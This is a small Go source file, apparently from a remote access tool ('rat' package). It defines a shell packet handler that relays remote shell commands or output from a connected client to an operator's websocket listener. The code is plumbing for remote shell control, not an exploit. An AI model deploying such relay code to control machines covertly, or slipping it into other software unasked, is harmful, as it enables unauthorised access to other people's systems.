package main

import (
	"rat/common"

	"golang.org/x/net/websocket"
)

type ShellPacket struct {
	Action  int    `send`
	Command string `both`
}

func (packet *ShellPacket) Header() common.PacketHeader {
	return common.ShellHeader
}

func (packet *ShellPacket) Init(c *Client) {

}

func (packet *ShellPacket) OnReceive(c *Client) error {
	if ws, ok := c.Listeners[common.ShellHeader]; ok {
		event := newEvent(Shell, c.Id, packet.Command)

		return websocket.JSON.Send(ws, &event)
	}

	return nil
}
